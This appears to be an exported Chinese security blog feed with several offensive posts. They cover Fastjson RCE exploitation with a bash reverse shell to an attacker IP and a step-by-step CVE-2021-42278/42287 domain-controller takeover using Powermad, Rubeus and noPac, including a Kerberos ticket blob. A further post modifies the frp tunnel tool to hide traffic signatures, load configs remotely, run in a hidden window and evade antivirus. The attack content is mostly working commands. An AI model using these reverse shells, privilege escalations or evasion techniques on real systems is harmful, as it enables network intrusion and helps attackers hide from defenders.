title="环境&amp;工具"></a>环境&amp;工具</h2><p>环境：<br>docker+vulhub+fastjson1.2.24-rce<br><a href="https://github.com/vulhub/vulhub">https://github.com/vulhub/vulhub</a></p><p>burp插件：<br><a href="https://github.com/Maskhe/FastjsonScan">https://github.com/Maskhe/FastjsonScan</a><br><a href="https://github.com/pmiaowu/BurpFastJsonScan">https://github.com/pmiaowu/BurpFastJsonScan</a></p><p>利用工具：<br><a href="https://github.com/c0ny1/FastjsonExploit">https://github.com/c0ny1/FastjsonExploit</a><br><a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在渗透中可采用burp插件的形式以被动或者主动去扫描探测目标是否存在漏洞，验证如下，直接发送到插件扫描即可（且可自动扫描可利用链）</p><p><img src="/images/image-20220215105048487.png" alt="image-20220215105048487"><br><img src="/images/image-20220215105149591.png" alt="image-20220215105149591"></p><p>由探测得出，当前可利用JdbcRowSetImpl链（JNDI注入），这里使用FastjonExploit一键利用，原理和上面分析差不多<br><img src="/images/image-20220215105847162.png" alt="image-20220215105847162"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar FastjsonExploit-0.1-beta2.jar JdbcRowSetImpl1 ldap:&#x2F;&#x2F;172.16.194.1:1232&#x2F;Exploit &quot;cmd:bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.16.194.1&#x2F;8880 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/image-20220215110216269.png" alt="image-20220215110216269"><br><img src="/images/image-20220215110244132.png" alt="image-20220215110244132"><br>即可收到反弹shell<br><img src="/images/image-20220215110327355.png" alt="image-20220215110327355"><br>当机器不出网的时候可以尝试bcel类执行命令回显，详见上面利用链。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://xz.aliyun.com/t/8979#toc-1">https://xz.aliyun.com/t/8979#toc-1</a><br><a href="https://paper.seebug.org/994/">https://paper.seebug.org/994/</a></p>]]></content>
      
      
      <categories>
          
          <category> fastjson </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-42278&amp;42287（域控）漏洞分析与利用</title>
      <link href="2021/12/19/CVE-2021-42278-42287%EF%BC%88%E5%9F%9F%E6%8E%A7%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
      <url>2021/12/19/CVE-2021-42278-42287%EF%BC%88%E5%9F%9F%E6%8E%A7%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2021-42278-42287（域控）漏洞分析与利用"><a href="#CVE-2021-42278-42287（域控）漏洞分析与利用" class="headerlink" title="CVE-2021-42278/42287（域控）漏洞分析与利用"></a>CVE-2021-42278/42287（域控）漏洞分析与利用</h1><h2 id="0x00-漏洞介绍"><a href="#0x00-漏洞介绍" class="headerlink" title="0x00 漏洞介绍"></a>0x00 漏洞介绍</h2><p>2021 年 11 月 9 日，国外研究员在推特上发布了 Active Directory 相关的 CVE，CVE-2021-42278 &amp; CVE-2021-42287 ，两个漏洞组合可导致域内普通用户权限提升至域管权限。</p><ul><li>CVE-2021-42278，机器账户的名字一般来说应该以$结尾，但AD没有对域内机器账户名做验证。</li><li>CVE-2021-42287，配合 CVE-2021-42278 使用，创建与域控机器账户名字相同的机器账户（不以$结尾），账户请求一个TGT后，更名账户，然后通过S4U2self 申请TGS Ticket，接着域控在 TGS_REP 阶段，这个账户不存在的时候，DC会使用自己的密钥加密 TGS Ticket ，提供一个属于该账户的 PAC，然后我们就得到了一个高权限ST。</li></ul><h2 id="0x01-影响范围"><a href="#0x01-影响范围" class="headerlink" title="0x01 影响范围"></a>0x01 影响范围</h2><ul><li><p>CVE-2021-42287</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Windows Server 2012 R2 (Server Core installation)</span><br><span class="line">Windows Server 2012 R2</span><br><span class="line">Windows Server 2012 (Server Core installation)</span><br><span class="line">Windows Server 2008 R2 for x64-based Systems Service Pack 1(Server Core installation)</span><br><span class="line">Windows Server 2012</span><br><span class="line">Windows Server 2008 R2 for x64-based Systems Service Pack 1</span><br><span class="line">Windows Server 2008 for x64-based Systems Service Pack 2(Server Core installation)</span><br><span class="line">Windows Server 2008 for x64-based Systems Service Pack 2</span><br><span class="line">Windows Server 2008 for 32-bit Systems Service Pack 2(Server Core installation)</span><br><span class="line">Windows Server 2008 for 32-bit Systems Service Pack 2</span><br><span class="line">Windows Server 2016 (Server Core installation)</span><br><span class="line">Windows Server 2016</span><br><span class="line">Windows Server, version 20H2 (Server Core Installation)</span><br><span class="line">Windows Server, version 2004 (Server Core installation)</span><br><span class="line">Windows Server 2022 (Server Core installation)</span><br><span class="line">Windows Server 2022</span><br><span class="line">Windows Server 2019 (Server Core installation)</span><br><span class="line">Windows Server 2019</span><br></pre></td></tr></table></figure></li><li><p>CVE-2021-42278</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Windows Server 2012 R2</span><br><span class="line">Windows Server 2012 (Server Core installation)</span><br><span class="line">Windows Server 2012</span><br><span class="line">Windows Server 2008 R2 for x64-based Systems Service Pack 1(Server Core installation)</span><br><span class="line">Windows Server 2008 R2 for x64-based Systems Service Pack 1</span><br><span class="line">Windows Server 2008 for x64-based Systems Service Pack 2(Server Core installation)</span><br><span class="line">Windows Server 2008 for x64-based Systems Service Pack 2</span><br><span class="line">Windows Server 2008 for 32-bit Systems Service Pack 2(Server Core installation)</span><br><span class="line">Windows Server 2008 for 32-bit Systems Service Pack 2</span><br><span class="line">Windows Server 2016 (Server Core installation)</span><br><span class="line">Windows Server 2016</span><br><span class="line">Windows Server, version 20H2 (Server Core Installation)</span><br><span class="line">Windows Server, version 2004 (Server Core installation)</span><br><span class="line">Windows Server 2022 (Server Core installation)</span><br><span class="line">Windows Server 2019 (Server Core installation)</span><br><span class="line">Windows Server 2022</span><br><span class="line">Windows Server 2019</span><br><span class="line">Windows Server 2012 R2 (Server Core installation)</span><br></pre></td></tr></table></figure></li></ul><h2 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h2><h3 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h3><ul><li><p>域控</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">域名：testvul.com</span><br><span class="line">账户：administrator</span><br><span class="line">密码：test123!</span><br><span class="line">计算机名：WIN-6A1HJFP87NE</span><br></pre></td></tr></table></figure></li></ul><p><img src="/images/image-20211219104525345.png" alt="image-20211219104525345"></p><ul><li><p>普通域账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">账户：testexp</span><br><span class="line">密码：Exp@123</span><br></pre></td></tr></table></figure></li></ul><p><img src="/images/image-20211219104611535.png" alt="image-20211219104611535"></p><ul><li><p>攻击机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kali Linux</span><br><span class="line">ip：192.168.12.3</span><br><span class="line">利用脚本：https:&#x2F;&#x2F;github.com&#x2F;WazeHell&#x2F;sam-the-admin</span><br><span class="line">Impacket v0.9.24</span><br></pre></td></tr></table></figure></li></ul><h3 id="一键exp"><a href="#一键exp" class="headerlink" title="一键exp"></a>一键exp</h3><p>Python 利用脚本：<a href="https://github.com/WazeHell/sam-the-admin">https://github.com/WazeHell/sam-the-admin</a></p><p><strong>前置条件：需要一个域用户</strong></p><p>利用过程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sam_the_admin.py &quot;testvul&#x2F;testexp:Exp@123&quot; -dc-ip 192.168.12.2 -shell</span><br></pre></td></tr></table></figure><p><img src="/images/image-20211219114305719.png" alt="image-20211219114305719"></p><p>十分简单粗暴，只需要一个域用户账户即可拿到 DC 的控制权限。</p><h3 id="深入分析利用"><a href="#深入分析利用" class="headerlink" title="深入分析利用"></a>深入分析利用</h3><p>具体流程：</p><ol><li><p>首先创建一个机器账户，可以使用 impacket 的 <code>addcomputer.py</code>或是<code>powermad</code></p><p><code>addcomputer.py</code>是利用<code>SAMR协议</code>创建机器账户，这个方法所创建的机器账户没有SPN，所以可以不用清除</p></li><li><p>清除机器账户的<code>servicePrincipalName</code>属性</p></li><li><p>将机器账户的<code>sAMAccountName</code>，更改为DC的机器账户名字，注意后缀不带$</p></li><li><p>为机器账户请求TGT</p></li><li><p>将机器账户的<code>sAMAccountName</code>更改为其他名字，不与步骤3重复即可</p></li><li><p>通过S4U2self协议向DC请求ST</p></li><li><p>进行 DCsync Attack</p></li></ol><h4 id="普通域账户"><a href="#普通域账户" class="headerlink" title="普通域账户"></a>普通域账户</h4><p>1、首先 testexp用户是一个普通的域用户：</p><p><img src="/images/image-20211219104611535.png" alt="image-20211219104611535"></p><h4 id="新增机器账户"><a href="#新增机器账户" class="headerlink" title="新增机器账户"></a>新增机器账户</h4><p>2、通过利用 <code>powermad.ps1</code> 新增机器帐号（域用户默认可以新建10个机器账户）</p><p>下载地址：<a href="https://github.com/Kevin-Robertson/Powermad">https://github.com/Kevin-Robertson/Powermad</a></p><p>命令语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">powershell Set-ExecutionPolicy Bypass -Scope Process </span><br><span class="line"></span><br><span class="line">Import-Module .\Powermad.ps1</span><br><span class="line"></span><br><span class="line"># 运行完后需要输入一下密码：whoami（可任意密码）</span><br><span class="line">New-MachineAccount -MachineAccount saulgoodman -Domain testvul.com -DomainController WIN-6A1HJFP87NE.testvul.com -Verbose</span><br><span class="line"></span><br><span class="line"># 验证是否添加成功</span><br><span class="line">net group &quot;domain computers&quot; &#x2F;domain</span><br></pre></td></tr></table></figure><p><img src="/images/image-20211219122042212.png" alt="image-20211219122042212"></p><h4 id="清除SPN信息"><a href="#清除SPN信息" class="headerlink" title="清除SPN信息"></a>清除SPN信息</h4><p>3、clear its SPNs（清除SPN信息）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 导入一下 PowerView.ps1</span><br><span class="line">Import-Module .\PowerView.ps1</span><br><span class="line"></span><br><span class="line">Set-DomainObject &quot;CN&#x3D;saulgoodman,CN&#x3D;Computers,DC&#x3D;testvul,DC&#x3D;com&quot; -Clear &#39;serviceprincipalname&#39; -Verbose</span><br></pre></td></tr></table></figure><p><img src="/images/image-20211219122640220.png" alt="image-20211219122640220"></p><h4 id="重设机器名称"><a href="#重设机器名称" class="headerlink" title="重设机器名称"></a>重设机器名称</h4><p>4、reset the computer name（重设机器名称）</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-MachineAccountAttribute -MachineAccount saulgoodman -Value &quot;WIN-6A1HJFP87NE&quot; -Attribute samaccountname -Verbose</span><br></pre></td></tr></table></figure><p><img src="/images/image-20211219123212279.png" alt="image-20211219123212279"></p><h4 id="请求TGT"><a href="#请求TGT" class="headerlink" title="请求TGT"></a>请求TGT</h4><p>5、Request TGT （请求TGT）</p><p>Rubeus：<a href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;Rubeus.exe asktgt &#x2F;user:WIN-6A1HJFP87NE &#x2F;password:whoami &#x2F;domian:testvul.com &#x2F;dc:WIN-6A1HJFP87NE.testvul.com &#x2F;nowrap</span><br></pre></td></tr></table></figure><p><img src="/images/image-20211219143057752.png" alt="image-20211219143057752"></p><h4 id="改回原来属性"><a href="#改回原来属性" class="headerlink" title="改回原来属性"></a>改回原来属性</h4><p>6、Change Machine Account samaccountname（改回原来属性，或者其他的）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-MachineAccountAttribute -MachineAccount saulgoodman -Value &quot;saulgoodman1&quot; -Attribute samaccountname -Verbose</span><br></pre></td></tr></table></figure><p><img src="/images/image-20211219143206857.png" alt="image-20211219143206857"></p><h4 id="获取票据"><a href="#获取票据" class="headerlink" title="获取票据"></a>获取票据</h4><p>7、Request S4U2self（获取票据）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;Rubeus.exe s4u &#x2F;self &#x2F;impersonateuser:&quot;Administrator&quot; &#x2F;altservice:&quot;ldap&#x2F;WIN-6A1HJFP87NE.testvul.com&quot; &#x2F;dc:&quot;WIN-6A1HJFP87NE.testvul.com&quot; &#x2F;ptt &#x2F;ticket:doIFMjCCBS6gAwIBBaEDAgEWooIEQzCCBD9hggQ7MIIEN6ADAgEFoQ0bC1RFU1RWVUwuQ09NoiAwHqADAgECoRcwFRsGa3JidGd0Gwt0ZXN0dnVsLmNvbaOCA&#x2F;0wggP5oAMCARKhAwIBAqKCA+sEggPnD&#x2F;AcnlKhVtqXVzXf9cC5O3xdB2K3hAuCHF4wDiy2mnZ0VbdcqrfaDTi24soBSMBy8X3EJ2BxyOK&#x2F;BtBYR4YzNZwHg02jHE0PJO100Qin5aayv25eahO1aDiEj4HWeayzA9lS8p93enlHy4e5iVnEsoh92ug6ujhp9TaVtIBacdWk+FHZxAvLX71sk4CH0pmqXW1NQjLlrYmh70fyOVns7BBnFRPBxPwEIGbqx3Xuq7ZpZGmvbanZECQSdW6qXRVRqAb2kYilREylLYh+PeNFcjKn9u3aWIBmsR4jl3XUTEDlNhWnnxE8tL1U+72OKtWWCm8G0BurWiefox5Z2JdADcIVvJVAjZUyXsjOnIfA9Cg6KF37QorHwB08nIicwIUaTJYyxe0vz9z0c&#x2F;SVQXLpPyRvSdNh7DYa2AA5tWP3LwJSyrko6nsCZ2HztvliffvrbTCA0VgHRdomeNyEYKYJjIzSwMCqnLWsM5etZwYRKUfPsNYrXzpqR&#x2F;iaYWshoMtz42ghDHCFUdoIH0XzkNiYW8sxwqWiXuvPtALbXWErG1hEQxcuW&#x2F;yw93qpprx6okMpjD1qjwkR09j45Hgk7Y76aaMrUzuBMZjuWxwVdBSGmyBnViNCO9WlXddS6veXAWNdy5zlXJfpt6FTF2UHRW2MLnyHvD5&#x2F;SKPwrAsXFBPzugNKVUu&#x2F;D0kEr2nsF7gFQWic6u0sGEqMUnzdUL5hB+p3YePiU36Tu60sbTQkPOg8JlduNVUNrSmrzwOsTC+SFNX8NQZ6nu+&#x2F;4gkQN+yDI4CTokl1qZ7Ct3dZqn525PnnYPERXQte534Q3FdXM5bjhTomW7v0ORj0XBN+0qWsPcoTJCEAo78y&#x2F;+&#x2F;Cg+JxZ5nfV2v+fgNkePmt7RHND5XYtV+5PXKaT2wI9&#x2F;v+YAWFTHNFdNAPI&#x2F;1742L26Qfha7rTQAmNiU3LZWaoHSyMg+OXoT9B1O9ONyiT736hYKKPkiH5&#x2F;1zRDQwvFig62eO93Uec81L3rYUUhhAC&#x2F;E1FxoiUVmlmzyfunFjQ6rhGql9CpcuvOF3HveP8lF2reXwsxZRdqG9mZEiCCQ5&#x2F;CGCtOTE5xmDB1gqlYaJvdX774Y1OJMGep51wD+2z9juYgobpA9yxsgIuNgARprHX4Qc7cOsUhSOq2Wep++Fmy35FCo5WZK7JZbAmynsNGNxOXT2UGe7Gf3IyY5RB28Ps2HxgKgt3TAd9rQlj&#x2F;QmqjpGmXA4asxfRiqnvdHRoTj3omHF3Q4ZvO1OLcSg3NSeOSP56oDAHedl6SWwtJAITqcvd8e0t+7rsOiR762nIrev6dJvXgROxE&#x2F;bDfJgSZzpDo4HaMIHXoAMCAQCigc8Egcx9gckwgcaggcMwgcAwgb2gGzAZoAMCARehEgQQoF35WdUPtmjXCQESgXAaBqENGwtURVNUVlVMLkNPTaIcMBqgAwIBAaETMBEbD1dJTi02QTFISkZQODdORaMHAwUAQOEAAKURGA8yMDIxMTIxOTA2MjkxMVqmERgPMjAyMTEyMTkxNjI5MTFapxEYDzIwMjExMjI2MDYyOTExWqgNGwtURVNUVlVMLkNPTakgMB6gAwIBAqEXMBUbBmtyYnRndBsLdGVzdHZ1bC5jb20&#x3D;</span><br></pre></td></tr></table></figure><p><img src="/images/image-20211219144251872.png" alt="image-20211219144251872"></p><h3 id="noPac利用"><a href="#noPac利用" class="headerlink" title="noPac利用"></a>noPac利用</h3><p>使用：<a href="https://github.com/cube0x0/noPac">https://github.com/cube0x0/noPac</a> （需安装 .net 4.0+）</p><h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><p>1、扫描是否存在漏洞：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\noPac.exe scan -domain testvul.com -user testexp -pass &#39;Exp@123&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image-20211219144814261.png" alt="image-20211219144814261"></p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>2、漏洞利用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;noPac.exe -domain testvul.com -user testexp -pass &#39;Exp@123&#39; &#x2F;dc WIN-6A1HJFP87NE.testvul.com &#x2F;mAccount saulgoodman &#x2F;mPassword passW0rd &#x2F;service cifs &#x2F;ptt</span><br></pre></td></tr></table></figure><h2 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h2><ol><li>微软官方已推出补丁：KB5008602、KB5008380</li><li>通过域控的 ADSI 编辑器工具将 AD 域的 MAQ 配置为 0，中断此漏洞的利用链。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 域渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>frp改造</title>
      <link href="2021/09/26/frp%E6%94%B9%E9%80%A0/"/>
      <url>2021/09/26/frp%E6%94%B9%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="frp改造"><a href="#frp改造" class="headerlink" title="frp改造"></a>frp改造</h1><ul><li>.ini配置文件泄露服务器信息</li><li>frp 建立 TLS 连接的第一个字节为 0x17</li><li>客户端的留存的配置文件较敏感</li></ul><h2 id="去除特征值"><a href="#去除特征值" class="headerlink" title="去除特征值"></a>去除特征值</h2><ul><li>通过配置文件加密压缩数据，达到去除流量特征的目的。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 192.168.205.137</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line">token &#x3D; 123456</span><br><span class="line">tls_enable &#x3D; true</span><br><span class="line">use_encryption &#x3D; true</span><br><span class="line">use_compression &#x3D; true</span><br><span class="line">protocol &#x3D; websocket</span><br><span class="line"></span><br><span class="line">[rdp]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_ip &#x3D; 127.0.0.1      </span><br><span class="line">local_port &#x3D; 3389</span><br><span class="line">remote_port &#x3D; 7001</span><br></pre></td></tr></table></figure><ul><li>使用tls： tls_enable = true</li><li>压缩数据： use_compression = true。</li><li>使用websocket通信： protocol = websocket</li></ul><h2 id="tls特征"><a href="#tls特征" class="headerlink" title="tls特征"></a>tls特征</h2><ul><li>非TLS特征明显</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frpc.ini 加入tls_enable &#x3D; true</span><br></pre></td></tr></table></figure><p>从 v0.25.0 版本开始 frpc 和 frps 之间支持通过 TLS 协议加密传输。通过在 frpc.ini 的 common 中配置 tlsenable = true 来启用此功能，安全性更高。为了端口复用，frp 建立 TLS 连接的第一个字节为 0x17。通过将 frps.ini 的 [common] 中 tlsonly 设置为 true，可以强制 frps 只接受 TLS 连接。</p><ul><li>tls特征改造，<a href="https://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649740618&idx=1&sn=f1d67aaeab34a0329c5b648c7982c143">第一个字节为0x17</a></li></ul><h2 id="支持http远程加载配置文件"><a href="#支持http远程加载配置文件" class="headerlink" title="支持http远程加载配置文件"></a>支持http远程加载配置文件</h2><p>配置文件留在客户端不安全，且麻烦，也难以部署等等</p><p>通常来说我们的跳板机都是默认可以访问到我们部署的服务端的,</p><p>那么为什么我们不采取远程加载配置文件的方式呢？</p><p>ex:frpc -c <a href="http://xq17.org/frpc.ini">http://xq17.org/frpc.ini</a></p><p>这种方式当然也是兼容原来指定本地路径的,也就是说原生功能并不影响。</p><p>这种方案好处如下:</p><p>1.考虑安全性,可以考虑采取对配置文件进行异或,笔者觉得这个没啥用,你们可以自己发挥</p><p>2.针对1,我建议的是,执行成功之后,直接关掉你的远程配置文件就行了,没有那么多花里胡哨的。</p><p>代码如下:</p><p>记得引入一下net/http的库</p><p>models/config/value.go修改其中函数为如下(版本0.37.1):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">func GetRenderedConfFromFile(path string) (out []byte, err error) &#123;</span><br><span class="line">var b []byte</span><br><span class="line">rawUrl :&#x3D; path</span><br><span class="line">if strings.Index(rawUrl, &quot;http&quot;) !&#x3D; -1 &#123;</span><br><span class="line">log.Info(&quot;http schema&quot;)</span><br><span class="line">response, _err1 :&#x3D; http.Get(path)</span><br><span class="line">if _err1 !&#x3D; nil &#123;</span><br><span class="line">panic(_err1)</span><br><span class="line">&#125;</span><br><span class="line">defer response.Body.Close()</span><br><span class="line">b, _err :&#x3D; ioutil.ReadAll(response.Body)</span><br><span class="line">if _err !&#x3D; nil &#123;</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line">out, err &#x3D; RenderContent(b)</span><br><span class="line">return</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line">log.Info(&quot;local path&quot;)</span><br><span class="line">b, err &#x3D; ioutil.ReadFile(path)</span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line">out, err &#x3D; RenderContent(b)</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/image-20210925161919691-16325579620551.png" alt="image-20210925161919691"></p><h2 id="编译生成"><a href="#编译生成" class="headerlink" title="编译生成"></a>编译生成</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go build -o win64fp-http.exe main.go</span><br></pre></td></tr></table></figure><h2 id="更改图标、界面"><a href="#更改图标、界面" class="headerlink" title="更改图标、界面"></a>更改图标、界面</h2><ul><li><p>提取exe图标（<a href="https://down.52pojie.cn/Tools/Editors/Restorator_2018_v3.90_Build_1793.7z%EF%BC%89">https://down.52pojie.cn/Tools/Editors/Restorator_2018_v3.90_Build_1793.7z）</a></p></li><li><p>Resource Hacker（<a href="https://down.52pojie.cn/Tools/Editors/Resource_Hacker.zip%EF%BC%89">https://down.52pojie.cn/Tools/Editors/Resource_Hacker.zip）</a></p></li></ul><p>打开需要更改的exe文件</p><p><img src="/images/image-20210925162428591-16325582711352.png" alt="image-20210925162428591"></p><p>选择需要加载的ico图标</p><p><img src="/images/image-20210925162534366.png" alt="image-20210925162534366"></p><p>加载完点击保存图标，即可</p><p><img src="/images/image-20210925162631651.png" alt="image-20210925162631651"></p><h2 id="upx压缩加壳"><a href="#upx压缩加壳" class="headerlink" title="upx压缩加壳"></a>upx压缩加壳</h2><p>使用upx压缩体积</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upx.exe -<span class="number">9</span> win64fp-http.exe</span><br></pre></td></tr></table></figure><p><img src="/images/image-20210925162817809.png" alt="image-20210925162817809"></p><h2 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h2><ul><li>windows后台运行的bat参考代码</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@echo off </span><br><span class="line">if &quot;%1&quot; &#x3D;&#x3D; &quot;h&quot; goto begin </span><br><span class="line">mshta vbscript:createobject(&quot;wscript.shell&quot;).run(&quot;%~nx0 h&quot;,0)(window.close)&amp;&amp;exit </span><br><span class="line">:begin </span><br><span class="line">c:\frpc.exe -c c:\frpc.ini</span><br></pre></td></tr></table></figure><ul><li>cmd</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">win64fpc-http.exe -c  http:&#x2F;&#x2F;192.168.205.137:8081&#x2F;frpc.ini</span><br></pre></td></tr></table></figure><p><img src="/images/image-20210925164222061-16325593432133.png" alt="image-20210925164222061"></p><p><img src="/images/image-20210925164452415-16325594940294.png" alt="image-20210925164452415"></p><p><img src="/images/image-20210925164518739-16325595197805.png" alt="image-20210925164518739"></p><p>使用360&amp;火绒检测，本文写于2021.9.25下午，此时frp还未被查杀，如果查杀根据我下面给出的思路，进行免杀。别上传云查杀了，要不然直接给你秒了。</p><ul><li>添加图片，添加无用资源。</li><li>变换upx压缩的级别</li><li>修改upx压缩特征</li></ul><p><img src="/images/image-20210925163225297.png" alt="image-20210925163225297"></p>]]></content>
      
      
      <categories>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
            <tag> frp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域渗透总结</title>
      <link href="2021/06/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/"/>
      <url>2021/06/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/</url>
      
